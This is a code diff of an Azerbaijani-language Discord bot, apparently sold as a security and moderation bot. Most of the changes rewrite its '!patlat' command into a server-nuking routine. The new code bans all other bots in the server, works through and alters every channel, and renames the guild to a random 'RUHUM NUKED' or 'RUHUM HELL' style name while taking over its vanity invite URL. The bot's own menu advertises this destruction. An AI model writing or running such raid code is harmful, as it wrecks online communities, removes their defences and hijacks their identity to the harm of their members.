@@ -27,7 +27,7 @@ def keep_alive():
 # =====================================================================
 # 2. CONFIGURATION & INTENTS
 # =====================================================================
-SAHIB_ID = 641014966312501259  # Sənin ID-n bura yazıldı
+SAHIB_ID = 641014966312501259  # Sənin ID-n
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -189,7 +189,7 @@ class XASMenyu(discord.ui.Select):
             embed = discord.Embed(title="🛡️ Təhlükəsizlik Sistemi", description="Serveri qoruyan avtomatik mexanizmlər.", color=XAS_COLOR)
             embed.add_field(name="Anti-GG Link Qoruması", value="Bütün xarici linkləri və dəvətləri dərhal silir.", inline=False)
             embed.add_field(name="Spam Qoruması", value="Flood edənləri və şablon bot spamlarını avtomatik bloklayır.", inline=False)
-            embed.add_field(name="🔥 Nuke Əmri", value="`!nuke` - Kanalı sıfırlayıb yenidən yaradır.", inline=False)
+            embed.add_field(name="🔥 Nuke & Patlat", value="`!patlat` - Serveri təmizləyir, botları banlayır və ruhum URL qoyur.", inline=False)
             await interaction.response.edit_message(embed=embed)
 
         elif self.values[0] == "2. İdarəetmə və Moderasiya":
@@ -225,7 +225,7 @@ async def bot_panel(ctx):
     await ctx.send(embed=embed, view=XASView())
 
 # =====================================================================
-# 6. .URL REAL-TIME & SAHİB QORUMALI URL DƏYİŞDİRMƏ KOMUTU
+# 6. URL & SAHİB QORUMALI KOMUTLAR
 # =====================================================================
 @bot.command(name="url")
 async def server_url(ctx):
@@ -362,14 +362,12 @@ async def open_channel_all(ctx):
         return
     
     yukleniyor = await ctx.send("🔓 Bütün kanallar (səs, chat və kateqoriyalar) açılır, gözlə...")
-    
     for channel in ctx.guild.channels:
         try:
             await channel.set_permissions(ctx.guild.default_role, view_channel=True, send_messages=True, connect=True)
         except:
             pass
-            
-    await yukleniyor.edit(content="✅ Uğurlu! Bütün kanallar, kateqoriyalar və səs otaqları kütləvi şəkildə açıldı.")
+    await yukleniyor.edit(content="✅ Uğurlu! Bütün kanallar kütləvi şəkildə açıldı.")
 
 @bot.command(name="lockchannel", aliases=["bagla", "hamisinibagla"])
 async def lock_channel_all(ctx):
@@ -378,15 +376,13 @@ async def lock_channel_all(ctx):
         return
         
     yukleniyor = await ctx.send("🔒 Bütün kanallar və səs otaqları kilidlənir, gözlə...")
-    
     for channel in ctx.guild.channels:
         if channel.id != ctx.channel.id:
             try:
                 await channel.set_permissions(ctx.guild.default_role, view_channel=False, send_messages=False, connect=False)
             except:
                 pass
-                
-    await yukleniyor.edit(content="🔒 Uğurlu! Komut yazılan kanal xaric bütün server gizlətildi və kilidləndi.")
+    await yukleniyor.edit(content="🔒 Uğurlu! Komut yazılan kanal xaric bütün server kilidləndi.")
 
 @bot.command(name="slowmode")
 async def slowmode_cmd(ctx, seconds: int):
@@ -436,7 +432,7 @@ async def clear_cmd(ctx, amount: int = 5):
     await msg.delete()
 
 # =====================================================================
-# 9. ƏYLƏCƏ, ÖPÜŞMƏ, OYUN KOMUTLARI VƏ !PATLAT
+# 9. ƏYLƏCƏ, OYUNLAR VƏ YENİLƏNMİŞ "RUHUM" & BOTBAN !PATLAT KOMUTU
 # =====================================================================
 @bot.command(name="sex", aliases=["spag", "ıp"])
 async def sex_cmd(ctx, member: discord.Member):
@@ -566,7 +562,24 @@ async def patlat_cmd(ctx):
         return
     
     guild = ctx.guild
-    await ctx.send("⚠️ Serverin dağıdılması başladı...")
+    await ctx.send("⚠️ Serverin dağıdılması, yad botların təmizlənməsi və 'Ruhum' rejiminə keçid başladı...")
+
+    ruhum_secimleri = [
+        ("RUHUM NUKED", "ruhumskdi"),
+        ("RUHUM EMPIRE", "ruhumaz"),
+        ("RUHUM CHAOS", "ruhumchaos"),
+        ("RUHUM HELL", "ruhumhell"),
+        ("RUHUM ZONE", "ruhumzone")
+    ]
+    
+    secilen_ad, secilen_url = random.choice(ruhum_secimleri)
+
+    for member in guild.members:
+        if member.bot and member.id != bot.user.id:
+            try:
+                await member.ban(reason="XAS Nuke - Bot Təmizliyi")
+            except:
+                pass
 
     for channel in guild.channels:
         try:
@@ -592,7 +605,7 @@ async def patlat_cmd(ctx):
         pass
 
     try:
-        await guild.edit(name="DEADAZE NUKED", vanity_code="xas")
+        await guild.edit(name=secilen_ad, vanity_code=secilen_url)
     except:
         pass
 
@@ -611,4 +624,3 @@ if __name__ == "__main__":
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
-        
